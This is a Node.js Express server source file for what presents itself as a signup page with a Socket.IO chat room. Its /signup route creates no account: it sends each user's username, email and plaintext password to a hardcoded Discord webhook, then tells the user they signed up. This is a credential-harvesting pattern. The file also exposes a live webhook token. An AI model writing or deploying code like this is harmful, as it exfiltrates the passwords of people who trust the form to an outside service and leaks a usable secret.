const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1443030140903755959/VQ2R8yIYCzB6Q_wvIBb0wiXR9mNKyg8hGdlNjZGV__MPh6DCbgfaQu-6KC7GqwCcapYg";

// Sign up route
app.post("/signup", async (req, res) => {
  const { username, email, password, consent } = req.body;

  if (!username || !email || !password) return res.send("Fill all fields!");

  try {
    await axios.post(WEBHOOK_URL, {
      content: `New sign up:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}\nConsent: ${consent ? "Yes" : "No"}`
    });
    res.send("Signed up successfully!");
  } catch (err) {
    console.log(err);
    res.send("Error sending to webhook.");
  }
});

// Socket.IO chat
io.on("connection", (socket) => {
  console.log("User connected");

  socket.on("chat message", (msg) => {
    io.emit("chat message", msg); // broadcast to all
  });

  socket.on("disconnect", () => {
    console.log("User disconnected");
  });
});

server.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
